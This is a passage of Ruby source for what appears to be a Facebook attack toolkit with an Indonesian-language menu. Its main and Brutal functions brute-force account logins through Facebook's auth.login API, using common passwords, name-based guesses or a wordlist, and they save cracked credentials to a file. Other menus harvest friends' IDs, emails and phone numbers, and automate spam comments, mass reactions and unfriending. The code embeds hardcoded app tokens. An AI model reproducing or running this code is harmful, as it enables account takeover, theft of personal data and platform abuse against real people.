      sleep(0.8)
      Super()
  end
end

def main(id)
  pool = ThreadPool.new(size: 30)
  id.each do |i|
    pool.schedule do
      begin
        lanjut = true
        pw1 = ["Sayang","Anjing","Bangsat","Kontol","Doraemon"]
        for pass in pw1
          url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + i + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
          req = URI.open(url,'User-Agent'=>$user_agent).read()
          res = JSON.parse(req)
          if res.key? ('access_token')
            $ok += 1
            File.open("super.txt", "a") { |f| f.write "#{i} | #{pass}\n" }
            puts ("#{$g}[OK] #{i} | #{pass}#{$a}")
            lanjut = false
            break
          elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
            $cp += 1
            File.open("super.txt", "a") { |f| f.write "#{i} | #{pass}\n" }
            puts ("#{$y}[CP] #{i} | #{pass}#{$a}")
            lanjut = false
            break
          end
        end
        if lanjut
          a = Request("#{i}?")
          name = ERB::Util.url_encode(a['name'])
          first = ERB::Util.url_encode(a['first_name'])
          last = ERB::Util.url_encode(a['last_name'])
          pw2 = [name + '123',name + '12345',first + '123',first + '12345',last + '123',last + '12345']
          for pwd in pw2
            params = {'access_token'=> '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','format'=> 'JSON','sdk_version'=> '2','email'=> i,'locale'=> 'en_US','password'=> pwd,'sdk'=> 'ios','generate_session_cookies'=> '1','sig'=> '3f555f99fb61fcd7aa0c44f58f522ef6'}
            uri = URI("https://b-api.facebook.com/method/auth.login")
            uri.query = URI.encode_www_form(params)
            req = Net::HTTP.get_response(uri)
            res = JSON.parse(req.body)
            if res.key? ('access_token')
              $ok += 1
              File.open("super.txt", "a") { |f| f.write "#{i} | #{pwd}\n" }
              puts ("#{$g}[OK] #{i} | #{pwd}#{$a}")
              break
            elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
              $cp += 1
              File.open("super.txt", "a") { |f| f.write "#{i} | #{pwd}\n" }
              puts ("#{$y}[CP] #{i} | #{pwd}#{$a}")
              break
            end
          end
        end
      rescue SocketError
        puts ("#{$y}[!] No Connection")
        sleep (0.2)
      rescue Errno::ETIMEDOUT
        puts ("#{$y}[!] Connection timed out#{$a}")
        sleep(0.2)
      rescue Errno::ENETUNREACH,Errno::ECONNRESET
        puts ("#{$y}[!] Slow Internet Connection")
        sleep(0.5)
      end
    end
  end
  pool.shutdown
end
            

def Brutal()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$r}[+] #{$g}Id#{$w}/#{$g}email#{$w}/#{$g}Phone #{$w}(#{$g}Target#{$w}) #{$r}: ")
  id = gets.chomp!
  print ("#{$r}[+] #{$g}Wordlist #{$w}ext(list.txt) #{$r}: ")
  file = gets.chomp!
  if File.file? (file)
    password = File.readlines(file, chomp: true)
    puts ("#{$r}[#{$c}✓#{$r}] #{$g}Target #{$r}: #{$w}#{id}")
    puts ("#{$r}[+] #{$g}Total #{$c}#{password.length} #{$g}Password ")
    puts ("#{$w}#{'═'*52}")
    for pw in password
      begin
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        puts ("#{$r}[+] #{$g}Login As #{$r}: #{$w}-> #{$g}#{id} #{$w}-> #{$g}#{pw}#{$a}")
        req = URI.open(url,'User-Agent'=>$user_agent).read()
        res = JSON.parse(req)
        if res.key? ('access_token')
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Success")
          puts ("#{$g}[✓] username : #{id}")
          puts ("#{$g}[✓] password : #{pw}")
          abort ("#{$r}[!] exit")
        elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
          puts ("#{$w}#{'═'*52}")
          puts ("#{$y}[!] Account Has Been Checkpoint")
          puts ("#{$y}[✓] username : #{id}")
          puts ("#{$y}[✓] password : #{pw}")
          abort ("#{$y}[!] exit")
        end
      rescue SocketError
        puts ("#{$r}[!] No Connection")
        sleep(0.2)
      rescue Errno::ETIMEDOUT,Net::OpenTimeout
        puts ("#{$y}[!] Connection timed out")
        sleep(0.5)
      rescue Interrupt
        puts ("\n#{$w}#{'═'*52}")
        abort("#{$w}[+] Stopped")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$r}[!] Sorry, opening password target failed :(")
    abort ("#{$r}[!] Try other method.")
  else
    puts ("#{$y}[+] File Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    Hamker()
  end
end

def GetMenu()
  total = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("║-> #{$w}1. Get ID From Friends")
  puts ("║-> #{$w}2. Get Friends ID From Friends")
  puts ("║-> #{$w}3. Get Friends Email")
  puts ("║-> #{$w}4. Get Friends Email From Friends")
  puts ("║-> #{$w}5. Get Phone From Friends")
  puts ("║-> #{$w}6. Get Friend\s Phone From Friends")
  puts ("║-> #{$w}0. Back")
  print ("╚═#{$r}▶#{$w} ")
  get = gets.chomp!
  case get
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "id.txt" if file == "" or file[0] == " "
      File.open(file,'w') do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          total += 1
          id << i['id'] + "\n"
          puts ("#{$g}[✓] Name : #{i['name']}")
          puts ("#{$g}[✓] Id.  : #{i['id']}")
          puts ("#{$w}#{'═'*52}")
        end
      end
      puts ("#{$g}[✓] Total Id : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[+] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,'w') do |id|
          puts ("#{$w}#{'═'*52}")
          for i in b['data']
            total += 1
            id << i['id'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] Id.  : #{i['id']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
        puts ("#{$g}[✓] Total Id : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      end
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "email.txt" if file == "" or file[0] == " "
      File.open(file,"w") do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          b = Request("#{i['id']}?")
          if b.key? ('email')
            total += 1
            id << b['email'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] email: #{b['email']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
      end
      puts ("#{$g}[✓] Total email : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '4'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[+] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik ("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,"w") do |id|
          puts ("#{$w}#{'═'*52}")
          for i in b['data']
            c = Request("#{i['id']}?")
            if c.key? ('email')
              total += 1
              id << c['email'] + "\n"
              puts ("#{$g}[✓] Name : #{i['name']}")
              puts ("#{$g}[✓] email: #{b['email']}")
              puts ("#{$w}#{'═'*52}")
            end
          end
        end
        puts ("#{$g}[✓] Total email : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      end
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      tik ("#{$w}[+] Pleace Wait....")
      a = Request("me/friends?")
      abort ("#{$r}[!] Invalid Access Token") if a.key? ('error')
      print ("#{$w}[+] Save File (file.txt) : ")
      file = gets.chomp!
      file = "MobilePhone.txt" if file == "" or file[0] == " "
      File.open(file,"w") do |id|
        puts ("#{$w}#{'═'*52}")
        for i in a['data']
          b = Request("#{i['id']}?")
          if b.key? ('mobile_phone')
            total += 1
            id << b['mobile_phone'] + "\n"
            puts ("#{$g}[✓] Name : #{i['name']}")
            puts ("#{$g}[✓] phone: #{b['mobile_phone']}")
            puts ("#{$w}#{'═'*52}")
          end
        end
      end
      puts ("#{$g}[✓] Total phone : #{total}")
      puts ("#{$g}[✓] File : #{File.basename(file)}")
      puts ("#{$g}[✓] File Path #{File.realpath(file)}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      GetMenu()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Public Id : ")
      id = gets.chomp!
      a = Request("#{id}?")
      if a.key? ('error')
        puts ("#{$y}[!] User Not Found")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu()
      else
        tik ("#{$w}[+] From #{a['name']}")
        b = Request("#{id}/friends?")
        print ("#{$w}[+] Save File (file.txt) : ")
        file = gets.chomp!
        file = a['name'] + ".txt" if file == "" or file[0] == " "
        File.open(file,"w") do |id|
          puts ("#{$w}#{'═'*52}") 
          for i in b['data']
            c = Request("#{i['id']}?")
            if c.key? ('mobile_phone')
              total += 1
              id << c['mobile_phone'] + "\n"
              puts ("#{$g}[✓] Name : #{i['name']}")
              puts ("#{$g}[✓] phone: #{c['mobile_phone']}")
              puts ("#{$w}#{'═'*52}")
            end
          end
        end
        puts ("#{$g}[✓] Total phone : #{total}")
        puts ("#{$g}[✓] File : #{File.basename(file)}")
        puts ("#{$g}[✓] File Path #{File.realpath(file)}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        GetMenu() 
      end
    when '0'
      Hamker()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9) ; GetMenu()
  end
end

def Bot()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Post Reaction")
  puts ("#{$w}║-> 2. Post comments")
  puts ("#{$w}║-> 3. Add Friend")
  puts ("#{$w}║-> 4. Follow")
  puts ("#{$w}║-> 5. Share Post")
  puts ("#{$w}║-> 6. Delete Post")
  puts ("#{$w}║-> 7. Unfriends")
  puts ("#{$w}║-> 8. Unfollow")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  bots = gets.chomp!
  case bots
    when '1'
      ReactPostMenu()
    when '2'
      CommentPostMenu()
    when '3'
      AddFriendMenu()
    when '4'
      FollowMenu()
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Post Id : ")
      id = gets.chomp!
      a = Request("#{id}?fields=from,id")
      if !a.key? ('id')
        puts ("#{$y}[!] Post Not Found")
      else
        SharePost(link = "https://www.facebook.com/#{id}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Bot()
    when '6'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START..")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/feed?limit=5000")
      for i in a['data']
        begin
          id = i['id']
          b = Request("DELETE","#{id}?")
          if b == true
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{$name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{$name} #{$w}-> #{$y}#{id}")
          end
        rescue Interrupt
          puts ("\n#{$w}#{'═'*52}")
          puts ("#{$r}[!] Stopped")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
          Bot()
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Bot()
    when '7'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/friends?")
      if a.key? ('error')
        puts (a)
        abort ("#{$r}[!] Error")
      else
        for i in a['data']
          begin
            id = i['id']
            name = i['name']
            b = Request("DELETE","me/friends?uid=#{id}")
            if b == true
              s += 1
              puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
            else
              f += 1
              puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
            end
          rescue Interrupt
            puts ("\n#{$w}#{'═'*52}")
            puts ("#{$r}[!] Stopped")
            puts ("#{$g}[✓] Succes : #{s}")
            puts ("#{$y}[!] Failed : #{f}")
            puts ("#{$w}[+] Total  : #{s + f}#{$a}")
            print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
            Bot()
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Bot()
      end
    when '8'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] CTRL + C TO STOP")
      puts ("#{$w}[+] START")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/subscribedto?")
      for i in a['data']
        begin
          id = i['id']
          name = i['name']
          b = Request("DELETE","#{id}/subscribers?")
          if b == true
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        rescue Interrupt
          puts ("\n#{$w}#{'═'*52}")
          puts ("#{$r}[!] Stopped")
          puts ("#{$g}[✓] Succes : #{s}")
          puts ("#{$y}[!] Failed : #{f}")
          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
          print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
          Bot()
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      Bot()
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      Bot()
  end 
end

def ReactPostMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Target Post Reaction")
  puts ("#{$w}║-> 2. Group Post Reactions")
  puts ("#{$w}║-> 3. Random Target Post Reaction")
  puts ("#{$w}║-> 4. Random Group Post Reaction")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana 
    when '0'
      Bot()
    when '1'
      ReactPost()
    when '2'
      ReactGroup()
    when '3'
      ReactPostRandom()
    when '4'
      ReactGroupRandom()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9) ; ReactPostMenu()
  end
end

def React()
  loop do
    system("clear")
    puts ($logo)
    puts ("#{$w}#{'═'*52}")
    puts ("#{$w}║-> #{$p}1. LIKE")
    puts ("#{$w}║-> #{$m}2. LOVE")
    puts ("#{$w}║-> #{$y}3. HAHA")
    puts ("#{$w}║-> #{$y}4. WOW")
    puts ("#{$w}║-> #{$c}5. SAD")
    puts ("#{$w}║-> #{$r}6. ANGRY")
    puts ("#{$w}║")
    print ("╚═#{$r}▶#{$w} ")
    pilih = gets.chomp!
    if pilih == '1' or pilih == '01'
      return 'LIKE'
    elsif pilih == '2' or pilih == '02'
      return 'LOVE'
    elsif pilih == '3' or pilih == '03'
      return 'HAHA'
    elsif pilih == '4' or pilih == '04'
      return 'WOW'
    elsif pilih == '5' or pilih == '05'
      return 'SAD'
    elsif pilih == '6' or pilih == '06'
      return 'ANGRY'
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(1)
    end
  end
end

def ReactPost()
  s = 0
  f = 0
  tipe = React()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  print ("#{$w}[+] Limits : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    for i in a['feed']['data']
      id = i['id']
      a = Request("POST","#{id}/reactions?type=#{tipe}")
      if !a.key? ('error')
        s += 1 
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  end
end

def ReactPostRandom()
  s = 0
  f = 0
  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    for i in a['feed']['data']
      tipe = type.sample
      id = i['id']
      b = Request("POST","#{id}/reactions?type=#{tipe}")
      if !b.key? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  end
end

def ReactGroup()
  tipe = React()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    else
      for i in b['feed']['data']
        id = i['id']
        c = Request("POST","#{id}/reactions?type=#{tipe}")
        if !c.key? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    end
  end
end

def ReactGroupRandom()
  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    else
      for i in b['feed']['data']
        tipe = type.sample
        id = i['id']
        c = Request("POST","#{id}/reactions?type=#{tipe}")
        if !c.key? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    end
  end
end    

def CommentPostMenu()
  system("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Comment Target Post")
  puts ("#{$w}║-> 2. Comment Group Post")
  puts ("#{$w}║-> 3. Reply Comment")
  puts ("#{$w}║-> 4. Spam Comment")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when'1'
      CommentPost()
    when '2'
      CommentGroup()
    when '3'
      ReplyComment()
    when '4'
      SpamComment()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      CommentPostMenu()
  end
end

def CommentPost()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  sub = body.tr("<>","\n")
  msg = ERB::Util.url_encode(sub)
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    for i in a['feed']['data']
      id = i['id']
      b = Request("POST","#{id}/comments?message=#{msg}")
      if !b.key? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end

def CommentGroup()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      CommentPostMenu()
    else
      sub = body.tr("<>","\n")
      msg = ERB::Util.url_encode(sub)
      for i in b['feed']['data']
        id = i['id']
        c = Request("POST","#{id}/comments?message=#{msg}")
        if !c.key? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      CommentPostMenu()
    end
  end
end

def ReplyComment()
  system ('clear')
  s = 0
  f = 0
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}[!] Use @tag to mention users")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Post Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  #sub = body.gsub("<>","\n")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}/comments?limit=#{limit}")
  if !a.key? ('data')
    puts ("#{$y}[!] Post Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  elsif a['data'].empty?
    puts ("#{$y}[!] No Comments On Posts")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    for i in a['data']
      id = i['id']
      user = '@['+i['from']['id']+ ':]'
      name = i['from']['name']
      #puts user
      sub = body.gsub("@tag",user)
      msg = sub.gsub("<>","\n")
      msg = ERB::Util.url_encode(msg)
      b = Request("POST","#{id}/comments?message=#{msg}")
      if !b.key? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{name} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{name} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
